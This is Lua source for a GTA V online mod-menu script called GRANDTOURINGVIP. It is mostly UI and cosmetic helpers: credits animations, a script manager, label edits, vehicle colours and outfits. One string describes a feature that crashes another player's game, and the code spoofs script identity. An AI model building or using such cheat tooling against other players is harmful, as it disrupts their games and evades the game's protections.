--[[
 ██████╗ ██████╗  █████╗ ███╗   ██╗██████╗ ████████╗ ██████╗ ██╗   ██╗██████╗ ██╗███╗   ██╗ ██████╗ ██╗   ██╗██╗██████╗ 
██╔════╝ ██╔══██╗██╔══██╗████╗  ██║██╔══██╗╚══██╔══╝██╔═══██╗██║   ██║██╔══██╗██║████╗  ██║██╔════╝ ██║   ██║██║██╔══██╗
██║  ███╗██████╔╝███████║██╔██╗ ██║██║  ██║   ██║   ██║   ██║██║   ██║██████╔╝██║██╔██╗ ██║██║  ███╗██║   ██║██║██████╔╝
██║   ██║██╔══██╗██╔══██║██║╚██╗██║██║  ██║   ██║   ██║   ██║██║   ██║██╔══██╗██║██║╚██╗██║██║   ██║╚██╗ ██╔╝██║██╔═══╝ 
╚██████╔╝██║  ██║██║  ██║██║ ╚████║██████╔╝   ██║   ╚██████╔╝╚██████╔╝██║  ██║██║██║ ╚████║╚██████╔╝ ╚████╔╝ ██║██║     
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝    ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝╚═╝      
GRANDTOURINGVIP™ Copyright© 2024 All rights reserved.]] 
GT_version = '12.20'
require "lib.GTlib.W"
require "lib.GTlib.O"
require "lib.GTlib.T"
require "lib.GTlib.GTA.table"
scaleform = require('lib.GTlib.Z')
translations = {} Lang = {} Lang.Version = "" Template = false
translations.lang = {} translations.current_translations = {} translations.missing_translations = {}
friends_in_this_session = {} modders_in_this_session = {} wait = util.yield joaat = util.joaat
GTluaScript = menu GT = GTluaScript.list GTAC = GTluaScript.action GTD = GTluaScript.divider 
GTLP = GTluaScript.toggle_loop GTTG = GTluaScript.toggle GTH = GTluaScript.hyperlink GTS = menu.textslider gtlog = util.log
New = {} Ini = {}
--
translations = {}
setmetatable(translations, {
    __index = function (self, key)
        return key
    end
})
function updatelogs()
    drawnotify("update all function")
end
--
hasShownToast = false
outdatanow = false
days30 = false
currentYear = tonumber(os.date("%Y"))
currentMonth = tonumber(os.date("%m"))
currentDay = tonumber(os.date("%d"))
notifyYear = 2024
notifyMonth = 7
notifyDay = 30
_G.daysSince = _G.daysSince or 0
--
pathld = filesystem.scripts_dir() .. 'lib/GTlib/GTW/display.lua'
if filesystem.exists(pathld) then
    require "lib.GTlib.GTW.display"
else
    gtoast("未检测到文件")
end

function manage_scripts_menu()
    local scripts_dir = filesystem.scripts_dir()
    if scripts_dir:sub(-1) == "\\" then
        scripts_dir = scripts_dir:sub(1, -2)
    end
    local created_menu_items = {}
    local function contains_chinese(str)
        return str:match("[\128-\191][\128-\191]") ~= nil
    end
    local function load_script_files()
        local files = filesystem.list_files(scripts_dir)
        local new_script_files = {}
        for _, file in ipairs(files) do
            if file:match("%.lua$") or file:match("%.pluto$") or file:match("%.txt$") then
                table.insert(new_script_files, file)
            end
        end
        return new_script_files
    end
    local lua_name = other_options:list("管理已安装的Lua脚本", {}, "实时检测：支持lua/pluto/txt文件格式，可在此管理Lua脚本")
    lua_name:action("打开文件夹", {}, "", function ()
        util.open_folder(scripts_dir)
    end)
    lua_name:divider("脚本名称")
    local function create_script_menu()
        local new_script_files = load_script_files()
        for _, script in ipairs(new_script_files) do
            local script_name = script:match("([^/\\]+)$")
            script_name = script_name:gsub("%.lua$", ""):gsub("%.pluto$", ""):gsub("%.txt$", "")
            if not created_menu_items[script_name] then
                created_menu_items[script_name] = lua_name:textslider(script_name, {}, script_name, {
                    [0] = "运行",
                    [1] = "停止",
                    [2] = "删除"
                }, function(value)
                    local script_path = scripts_dir .. "\\" .. script_name
                    if value == 0 then
                        if not contains_chinese(script_path) then
                            menu.trigger_commands("startlua" .. script_name)
                            menu.trigger_commands("lua" .. script_name)
                        else
                            util.toast("无效文件名(不可用中文名)")
                        end
                    elseif value == 1 then
                        if not contains_chinese(script_path) then
                            menu.trigger_commands("stoplua" .. script_name)
                        else
                            util.toast("无效文件名(不可用中文名)")
                        end
                    elseif value == 2 then
                        if script_name == "GRANDTOURINGVIP" then 
                            util.toast("受保护的文件，无法删除")
                            return
                        end
                        local extensions = {".lua", ".pluto", ".txt"}
                        local file_deleted = false
                        for _, ext in ipairs(extensions) do
                            local full_script_path = script_path .. ext
                            if filesystem.exists(full_script_path) then
                                local success, error = os.remove(full_script_path)
                                if success then
                                    util.toast("文件已删除: " .. script_name .. ext)
                                    file_deleted = true
                                    break
                                else
                                    util.toast("删除文件失败: " .. error)
                                end
                            end
                        end
                        if not file_deleted then
                            util.toast("文件不存在: " .. script_name)
                        end
                    end
                end)
            end
        end
        for script_name, menu_item in pairs(created_menu_items) do
            local found = false
            for _, script in ipairs(new_script_files) do
                local script_name_in_list = script:match("([^/\\]+)$")
                script_name_in_list = script_name_in_list:gsub("%.lua$", ""):gsub("%.pluto$", ""):gsub("%.txt$", "")
                if script_name == script_name_in_list then
                    found = true
                    break
                end
            end
            if not found then
                created_menu_items[script_name] = nil
                menu_item:delete()
            end
        end
    end
    local function start_file_watcher()
        while true do
            create_script_menu()
            util.yield()
        end
    end
    start_file_watcher()
end

--
loading_frames = {'', 'G', 'GR', 'GRA', 'GRAN', 'GRAND', 'GRANDT', 'GRANDTO', 'GRANDTOU', 'GRANDTOUR', 'GRANDTOURI', 'GRANDTOURIN', 'GRANDTOURING', 'GRANDTOURINGV', 'GRANDTOURINGVI', 'GRANDTOURINGVIP', 'GRANDTOURINGVIP', 'GRANDTOURING', 'GRAND', '', 'GRANDTOURINGVIP', '', 'GRANDTOURINGVIP', '', 'GRANDTOURINGVIP', '', 'GRANDTOURINGVIP', 'GRANDTOURINGVIP', 'GRANDTOURINGVIP'}
coasttext = "#点击后将自动开启悬浮模式传送至空中并且进行崩溃.\n#数秒后,您将自动被传送至机场,并且自动关闭悬浮模式.\n\n注:为了您的安全,不要试图观看对方"
bbtxt = "https://jq.qq.com/?_wv=1027&k=U3XOlyOF"
bbtct = "[点击此处加入官方群聊中进行询问]\n\n*加载脚本显示(请稍等...):#网络问题\n#建议更换您的节点/模式或加速器\n\n*加载脚本提示缺少(not found)文件,\n 或加载脚本提示缺少(no file)文件: #请重新安装脚本及脚本依赖文件\n#建议使用<丢丢原装lua>覆盖lua文件\n其他疑问与发现请联系开发人员,非常感谢您的支持儿,祝您游戏愉快儿~"
grouplink = "http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=s_TXl5bUz7qNHUDHJV9p4gcAsBwqNnmq&authKey=%2FlvMHJriXIPU%2FzftUdGe3nd7JTF9JdwgJ6lfS61V1NzlZRriXxxY9vx14BsgKwJV&noverify=0&group_code=716431566"
function toFloat(num)
    return (num / 10) * 10
end
--
function SETUP_SINGLE_LINE(scaleform)
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SETUP_SINGLE_LINE")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.5)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.5)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(70.0)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(125.0)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("left")
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end
function ADD_TEXT_TO_SINGLE_LINE(scaleform, text, font, colour)
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "ADD_TEXT_TO_SINGLE_LINE")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(text)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(font)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(colour)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_BOOL(true)
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end
cTime = util.current_time_millis
OpeningCredits = {handle = 0}
OpeningCredits.__index = OpeningCredits
function OpeningCredits.new()
	local self = setmetatable({}, OpeningCredits)
	self:REQUEST_SCALEFORM_MOVIE()
	return self
end
function OpeningCredits:SETUP_SINGLE_LINE(mcName, fadeInDuration, fadeOutDuration, x, y, align)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(self.handle, "SETUP_SINGLE_LINE")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(mcName)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(fadeInDuration)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(fadeOutDuration)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(x)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(y)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(align)
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end
function OpeningCredits:REQUEST_SCALEFORM_MOVIE()
	self.handle = request_scaleform_movie("OPENING_CREDITS")
end
function OpeningCredits:HAS_LOADED()
	return GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(self.handle)
end
function OpeningCredits:ADD_TEXT_TO_SINGLE_LINE(mcName, text, font, colour)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(self.handle, "ADD_TEXT_TO_SINGLE_LINE")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(mcName)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(text)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(font)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(colour)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_BOOL(true)
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end
function OpeningCredits:HIDE(mcName, stepDuration)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(self.handle, "HIDE")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(mcName)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(stepDuration)
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end
function OpeningCredits:SHOW_SINGLE_LINE(mcName)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(self.handle, "SHOW_SINGLE_LINE")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(mcName)
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end
function OpeningCredits:DRAW_FULLSCREEN(r, g, b, a)
	GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(self.handle, r, g, b, a, 0)
end
function set_scaleform_movie_as_no_longer_needed(handle)
	util.spoof_script("main_persistent", function ()
		local ptr = memory.alloc_int()
		memory.write_int(ptr, handle)
		GRAPHICS.SET_SCALEFORM_MOVIE_AS_NO_LONGER_NEEDED(ptr)
	end)
end
function OpeningCredits:SET_AS_NO_LONGER_NEEDED()
	set_scaleform_movie_as_no_longer_needed(self.handle)
end
function OpeningCredits:SETUP_CREDIT_BLOCK(mcName, x, y, align, fadeInDuration, fadeOutDuration)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(self.handle, "SETUP_CREDIT_BLOCK")
	GRAPHICS.BEGIN_TEXT_COMMAND_SCALEFORM_STRING("STRING")
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(mcName)
	GRAPHICS.END_TEXT_COMMAND_SCALEFORM_STRING()
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(x)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(y)
	GRAPHICS.BEGIN_TEXT_COMMAND_SCALEFORM_STRING("STRING")
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(align)
	GRAPHICS.END_TEXT_COMMAND_SCALEFORM_STRING()
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(fadeInDuration)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(fadeOutDuration)
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end
function OpeningCredits:ADD_ROLE_TO_CREDIT_BLOCK(mcName, role, xOffset, colour, isRawText)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(self.handle, "ADD_ROLE_TO_CREDIT_BLOCK")
	GRAPHICS.BEGIN_TEXT_COMMAND_SCALEFORM_STRING("STRING")
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(mcName)
	GRAPHICS.END_TEXT_COMMAND_SCALEFORM_STRING()
	GRAPHICS.BEGIN_TEXT_COMMAND_SCALEFORM_STRING("STRING")
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(role)
	GRAPHICS.END_TEXT_COMMAND_SCALEFORM_STRING()
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(xOffset)
	GRAPHICS.BEGIN_TEXT_COMMAND_SCALEFORM_STRING("STRING")
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(colour)
	GRAPHICS.END_TEXT_COMMAND_SCALEFORM_STRING()
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_BOOL(isRawText)
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end
function OpeningCredits:ADD_NAMES_TO_CREDIT_BLOCK(mcName, names, xOffset, delimeter, isRawText)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(self.handle, "ADD_NAMES_TO_CREDIT_BLOCK")
	GRAPHICS.BEGIN_TEXT_COMMAND_SCALEFORM_STRING("STRING")
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(mcName)
	GRAPHICS.END_TEXT_COMMAND_SCALEFORM_STRING()
	GRAPHICS.BEGIN_TEXT_COMMAND_SCALEFORM_STRING("STRING")
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(names)
	GRAPHICS.END_TEXT_COMMAND_SCALEFORM_STRING()
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(xOffset)
	GRAPHICS.BEGIN_TEXT_COMMAND_SCALEFORM_STRING("STRING")
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(delimeter)
	GRAPHICS.END_TEXT_COMMAND_SCALEFORM_STRING()
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_BOOL(isRawText)
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end
function OpeningCredits:SHOW_CREDIT_BLOCK(mcName, stepDuration)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(self.handle, "SHOW_CREDIT_BLOCK")
	GRAPHICS.BEGIN_TEXT_COMMAND_SCALEFORM_STRING("STRING")
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(mcName)
	GRAPHICS.END_TEXT_COMMAND_SCALEFORM_STRING()
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(stepDuration)
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end
function OpeningCredits:SPO()
    for _, id in ipairs(devid) do
        if players.get_name(players.user()) == id.playerrid then
            return "GTLua Developer"
        end
    end
    for _, id in ipairs(sxid) do
        if players.get_name(players.user()) == id.playeridx then
            return "GTLua Ultra VIP"
        end
    end
    for _, id in ipairs(spid) do
        if players.get_name(players.user()) == id.playerid then
            return "GTLua Pro VIP"
        else
            return "GTLua"
        end
    end
end
local openingCredits <const> = OpeningCredits.new()
if SCRIPT_MANUAL_START and not SCRIPT_SILENT_START and true then
	g_ShowingIntro = true
	local state = 0
	local timer <const> = newTimer()
	local menuPosX = menu.get_position()
	local posX = menuPosX > 0.5 and 0.0 or 100.0
	local align = posX == 0.0 and "left" or "right"
	util.create_tick_handler(function()
		if state == 0 and timer.elapsed() < 600 then
		elseif openingCredits:HAS_LOADED() then
			if state ==  0 then
				openingCredits:SETUP_SINGLE_LINE("production", 0.5, 0.5, posX, 0.0, align)
				openingCredits:ADD_TEXT_TO_SINGLE_LINE("production", 'Welcome', "$font5", "HUD_COLOUR_RED")
                openingCredits:ADD_TEXT_TO_SINGLE_LINE("production", 'To', "$font5", "HUD_COLOUR_FREEMODE")
                openingCredits:ADD_TEXT_TO_SINGLE_LINE("production", OpeningCredits:SPO(), "$font5", "HUD_COLOUR_PINK")
				openingCredits:ADD_TEXT_TO_SINGLE_LINE("production", "'" .. PLAYER.GET_PLAYER_NAME(players.user()) .. "'", "$font5", "HUD_COLOUR_ORANGE")
				openingCredits:SHOW_SINGLE_LINE("production")
				AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Pre_Screen_Stinger", players.user_ped(), "DLC_HEISTS_FINALE_SCREEN_SOUNDS", true, 20)
				state = 1
				timer.reset()
			end
			if state == 1  and timer.elapsed() >= 4000 then
				openingCredits:HIDE("production", 0.1667)
				state = 2
				timer.reset()
			end
			if state == 2 and timer.elapsed() >= 3000 then
				openingCredits:SETUP_SINGLE_LINE("Luascript", 0.5, 0.5, posX, 0.0, align)
				openingCredits:ADD_TEXT_TO_SINGLE_LINE("Luascript", "GRANDTOURINGVIP", "$font5", "HUD_COLOUR_PURPLE")
                openingCredits:ADD_TEXT_TO_SINGLE_LINE("Luascript", "Version", "$font5", "HUD_COLOUR_PINK")
				openingCredits:ADD_TEXT_TO_SINGLE_LINE("Luascript", '' .. GT_version, "$font5", "HUD_COLOUR_RED")
				openingCredits:SHOW_SINGLE_LINE("Luascript")
				AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "SPAWN", players.user_ped(), "BARRY_01_SOUNDSET", true, 20)
				state = 3
				timer.reset()
			end
			if state == 3 and timer.elapsed() >= 4000 then
				openingCredits:HIDE("Luascript", 0.1667)
				state = 4
				timer.reset()
			end
			if state == 4 and timer.elapsed() >= 3000 then
				openingCredits:SET_AS_NO_LONGER_NEEDED()
				g_ShowingIntro = false
				return false
			end
			openingCredits:DRAW_FULLSCREEN(255, 255, 255, 255)
		else
			openingCredits:REQUEST_SCALEFORM_MOVIE()
		end
	end)
end
function set_text(t, x, y, r, g, b, v)
    HUD.SET_TEXT_SCALE(1,v)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_COLOUR(r, g, b, 255)
    HUD.SET_TEXT_CENTRE(false)
    HUD.SET_TEXT_OUTLINE(true)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT(t)
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(x, y)
end
function do_label_preset(label, text)
    -- log("Setting up label present for label " .. label .. " with text " .. text)
    menu.trigger_commands("addlabel " .. label)
    local prep = "edit" .. string.gsub(label, "_", "") .. " " .. text
    menu.trigger_commands(prep)
end
function GTNB()
    do_label_preset("PM_WAIT", "正在引导")
    do_label_preset("HUD_JOINING", "GTVIP YYDS")
    do_label_preset("MP_SPINLOADING", "GTVIP YYDS")
    do_label_preset("HUD_LBD_FMP", "GTVIP 在线模式（公开，~1~）")
    do_label_preset("HUD_LBD_FMI", "GTVIP 在线模式（邀请，~1~）")
    do_label_preset("HUD_LBD_FMC", "GTVIP 在线模式（帮会，~1~）")
    do_label_preset("HUD_LBD_FMF", "GTVIP 在线模式（好友，~1~）")
    do_label_preset("HUD_LBD_FMS", "GTVIP 在线模式（单人，~1~）")
    do_label_preset("0X56F3BD49", "GTVIP 在线模式")
    do_label_preset("HUD_MAINTIT", "GRANDTOURINGVIP")
    do_label_preset("LOADING_SPLAYER_L", "请稍后 " .. PLAYER.GET_PLAYER_NAME(players.user()))
    do_label_preset("PM_QUIT_MP", "离开 GTVIP 在线模式")
    do_label_preset("PM_INF_LEAT", "离开 GTVIP 在线模式")
    do_label_preset("PM_INF_LEAB", "立刻前往GTVIP故事模式，您的所有游戏进度都将自动保存")
    do_label_preset("CMRC_STORE_OPEN", "GTVIP 商店\n现已开放!")
    do_label_preset("UI_FLOW_OP_CL_M", "关于 GRANDTOURINGVIP")
    do_label_preset("UI_FLOW_OP_CL", "关于 GRANDTOURINGVIP")
end
srgb = {
    cus = 100
}
function requestweapon(...)
    local arg = {...}
    for _, model in ipairs(arg) do
        WEAPON.REQUEST_WEAPON_ASSET(model, 31, 26)
        while not WEAPON.HAS_WEAPON_ASSET_LOADED(model) do
            wait()
        end
    end
end
function RGBNeonKit(pedm)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    for i = 0, 3 do
        VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, i, true)
    end
end
local rgb = {
    cus = 100
}
function zjbs()
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) ~= 0 then
        local vmod = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
        RGBNeonKit(players.user_ped())
        local red = (math.random(0, 255))
        local green = (math.random(0, 255))
        local blue = (math.random(0, 255))
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vmod, red, green, blue)
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vmod, red, green, blue)
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vmod, red, green, blue)
        wait(rgb.cus)
    end
end
function qzd()
    local color = {{64, 1}, {73, 2}, {51, 3}, {92, 4}, {89, 5}, {88, 6}, {38, 7}, {39, 8}, {137, 9}, {135, 10},
                   {145, 11}, {142, 12}}
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ~= 0 then
        local vmod = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
        RGBNeonKit(players.user_ped())
        local rcolor = math.random(1, 12)
        VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 22, true)
        VEHICLE.SET_VEHICLE_NEON_INDEX_COLOUR(vmod, color[rcolor][1])
        VEHICLE.SET_VEHICLE_COLOURS(vmod, color[rcolor][1], color[rcolor][1])
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vmod, 0, color[rcolor][1])
        VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vmod, color[rcolor][1])
        VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vmod, color[rcolor][2])
        wait(srgb.cus)
    end
end
--物体前置
function RequestModel(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
        wait()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
end
--空中漂移
function slerp(q1, q2, t)
    local cosTheta = q1.x * q2.x + q1.y * q2.y + q1.z * q2.z + q1.w * q2.w
    local startInterp, finishInterp
    if cosTheta < 0.0 then
        cosTheta = -cosTheta
        q2.x = -q2.x
        q2.y = -q2.y
        q2.z = -q2.z
        q2.w = -q2.w
    end
    if (1.0 - cosTheta) > 0.0001 then
        local theta = math.acos(cosTheta)
        local sinTheta = math.sin(theta)
        startInterp = math.sin((1.0 - t) * theta) / sinTheta
        finishInterp = math.sin(t * theta) / sinTheta
    else
        startInterp = 1.0 - t
        finishInterp = t
    end
    local x = startInterp * q1.x + finishInterp * q2.x
    local y = startInterp * q1.y + finishInterp * q2.y
    local z = startInterp * q1.z + finishInterp * q2.z
    local w = startInterp * q1.w + finishInterp * q2.w
    return {x = x, y = y, z = z, w = w}
end
function AllowVehicleToBePlacedInGarage(pid, veh)
    local networkId = NETWORK.VEH_TO_NET(veh);
    if (NETWORK.NETWORK_GET_ENTITY_IS_NETWORKED(veh)) then
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(networkId, true);
        VEHICLE.SET_VEHICLE_IS_STOLEN(veh, false);
    end
end
function addBlipForEntity(entity, blipSprite, colour)
    local blip = HUD.ADD_BLIP_FOR_ENTITY(entity)
    HUD.SET_BLIP_SPRITE(blip, blipSprite)
    HUD.SET_BLIP_COLOUR(blip, colour)
    HUD.SHOW_HEIGHT_ON_BLIP(blip, false)
    HUD.SET_BLIP_ROTATION(blip, SYSTEM.CEIL(ENTITY.GET_ENTITY_HEADING(entity)))
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(entity, false)
    util.create_thread(function()
        while not ENTITY.IS_ENTITY_DEAD(entity) do
            local heading = ENTITY.GET_ENTITY_HEADING(entity)
            HUD.SET_BLIP_ROTATION(blip, SYSTEM.CEIL(heading))
            wait()
            if ENTITY.IS_ENTITY_DEAD(entity) or ENTITY.IS_ENTITY_DEAD(entity) or not ENTITY.DOES_ENTITY_EXIST(entity, false) or VEHICLE.GET_VEHICLE_ENGINE_HEALTH(entity) <= 0 then
                util.remove_blip(blip)
                wait()
            end
        end
    end)
    return blip
end
--服装
function barefoot(freemode_ped)
    if (ENTITY.GET_ENTITY_MODEL(freemode_ped) == util.joaat("mp_f_freemode_01")) then
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 6, 35, 0, 0)
    else
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 6, 34, 0, 0)
    end
end
function wipe_outfit(freemode_ped)
    local hair = PED.GET_PED_DRAWABLE_VARIATION(freemode_ped, 2)
    local hair_tex = PED.GET_PED_TEXTURE_VARIATION(freemode_ped, 2)
    PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 1, 0, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 2, hair, hair_tex, 0)
    PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 3, 0, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 9, 0, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 7, 0, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 11, 0, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 8, 15, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 4, 0, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 6, 0, 0, 0) 
    PED.CLEAR_ALL_PED_PROPS(freemode_ped)
end
function shirtless(freemode_ped)
    if (ENTITY.GET_ENTITY_MODEL(freemode_ped) == util.joaat("mp_f_freemode_01")) then
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 3, 15, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 11, 15, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 8, 14, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 7, 0, 0, 0)
    else
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 3, 15, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 11, 15, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 8, 15, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 7, 0, 0, 0)
    end
end
function get_random_drawable_variation(freemode_ped, component, drawable)
    return math.random(0, PED.GET_NUMBER_OF_PED_TEXTURE_VARIATIONS(freemode_ped, component, drawable))-1
end
function barefoot(freemode_ped)
    if (ENTITY.GET_ENTITY_MODEL(freemode_ped) == util.joaat("mp_f_freemode_01")) then
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 6, 35, 0, 0)
    else
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 6, 34, 0, 0)
    end
end
function random_tropical_outfit(freemode_ped)
    if (ENTITY.GET_ENTITY_MODEL(freemode_ped) == util.joaat("mp_f_freemode_01")) then
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 3, 11, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 44, 269, get_random_drawable_variation(freemode_ped, 44, 269), 0)
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 4, 137, get_random_drawable_variation(freemode_ped, 4, 137), 0)
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 6, select(math.random(1, 2), 15, 16),get_random_drawable_variation(freemode_ped, 6, select(math.random(1, 2), 15, 16)), 0)
        if (math.random(0, 15) == 5) then
            barefoot(freemode_ped)
        elseif (math.random(0, 15) == 9) then
            shirtless(freemode_ped)
        elseif (math.random(0, 15) == 11) then
            shirtless(freemode_ped)
            barefoot(freemode_ped)
        end
    else
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 44, 260, get_random_drawable_variation(freemode_ped, 44, 260), 0)
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 4, 15, get_random_drawable_variation(freemode_ped, 4, 15), 0)
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 6, 16, get_random_drawable_variation(freemode_ped, 6, 16), 0)
        if (math.random(0, 15) == 5) then
            barefoot(freemode_ped)
        elseif (math.random(0, 15) == 9) then
            shirtless(freemode_ped)
        elseif (math.random(0, 15) == 11) then
            shirtless(freemode_ped)
            barefoot(freemode_ped)
        end
    end
end
